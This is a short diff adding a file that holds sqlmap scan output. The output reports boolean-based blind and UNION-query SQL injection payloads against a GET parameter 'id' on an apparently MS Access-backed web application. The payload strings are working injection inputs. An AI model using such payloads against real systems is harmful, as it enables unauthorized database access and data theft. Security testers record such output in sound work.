@@ -1,0 +1,12 @@
+sqlmap identified the following injection points with a total of 21 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=368 AND 2244=2244
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 10 columns
+    Payload: id=368 UNION ALL SELECT NULL,NULL,CHR(58)&CHR(117)&CHR(117)&CHR(120)&CHR(58)&CHR(85)&CHR(105)&CHR(87)&CHR(72)&CHR(85)&CHR(65)&CHR(86)&CHR(120)&CHR(115)&CHR(85)&CHR(58)&CHR(117)&CHR(114)&CHR(97)&CHR(58),NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM MSysAccessObjects%00
+---
